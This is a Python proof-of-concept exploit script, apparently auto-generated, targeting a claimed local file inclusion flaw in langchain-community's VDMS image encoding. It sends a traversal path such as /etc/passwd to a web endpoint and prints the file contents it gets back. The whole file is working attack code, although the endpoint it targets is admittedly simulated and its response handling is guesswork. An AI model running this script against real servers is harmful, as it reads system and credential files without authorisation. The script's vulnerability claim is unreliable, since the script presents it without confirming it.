#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-002
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_15.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `encode_image` function in VDMS vectorstore directly opens a file
path provided by the caller without validation. The `add_images` function passes
user-controlled `uris` directly to `encode_image`. An attacker can supply a path
like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign file
if /etc/passwd is not available) through the vulnerable endpoint.
"""

import requests
import base64
import sys
import os

# Configuration - change these as needed
TARGET_URL = "http://localhost:8000"  # Default target URL
ENDPOINT = "/api/v1/trigger"  # Simulated endpoint that calls add_images
TIMEOUT = 10  # Request timeout in seconds

# Benign payload by default - reads /etc/passwd (standard test file)
# Change to a harmless file if needed
PAYLOAD_FILE = "/etc/passwd"


def exploit_lfi(target_url, endpoint, file_path):
    """
    Attempt to exploit the LFI vulnerability by sending a malicious file path
    to the add_images function via the simulated endpoint.
    
    Args:
        target_url: Base URL of the target server
        endpoint: API endpoint path
        file_path: Path to the file to read (can include path traversal)
    
    Returns:
        Decoded file content if successful, None otherwise
    """
    # Construct the full URL
    url = f"{target_url.rstrip('/')}{endpoint}"
    
    # The payload is the file path we want to read
    # In the real exploit, this would be passed as the 'uris' parameter
    payload = {
        "uris": [file_path]  # List of paths to images
    }
    
    print(f"[*] Attempting LFI exploit against {url}")
    print(f"[*] Payload file path: {file_path}")
    
    try:
        # Send the request - the server will call add_images with our path
        response = requests.post(
            url,
            json=payload,
            timeout=TIMEOUT
        )
        
        print(f"[*] Response status code: {response.status_code}")
        
        if response.status_code == 200:
            # The response should contain base64-encoded file content
            # In a real scenario, this would be in the response body
            # For this PoC, we check if the response contains base64 data
            try:
                # Try to decode the response as base64
                decoded = base64.b64decode(response.text)
                print("[+] Success! File content:")
                print(decoded.decode('utf-8', errors='replace'))
                return decoded
            except:
                # If not base64, print raw response
                print("[*] Response (raw):")
                print(response.text[:500])  # First 500 chars
                return response.text
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:200]}")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {url}")
        print("[-] Make sure the target server is running")
        return None
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after {TIMEOUT} seconds")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None


def main():
    """Main function to run the exploit."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    # Use command-line arguments if provided
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    file_path = sys.argv[2] if len(sys.argv) > 2 else PAYLOAD_FILE
    
    print(f"[*] Target: {target}")
    print(f"[*] File to read: {file_path}")
    print()
    
    # Run the exploit
    result = exploit_lfi(target, ENDPOINT, file_path)
    
    if result:
        print("\n[+] Exploit completed successfully")
    else:
        print("\n[-] Exploit failed")
    
    print("\n" + "=" * 60)
    print("Note: This PoC assumes the target has a simulated endpoint")
    print("that calls add_images with user-controlled input.")
    print("In a real scenario, adjust the endpoint and payload format")
    print("to match the actual application's API.")
    print("=" * 60)


if __name__ == "__main__":
    main()
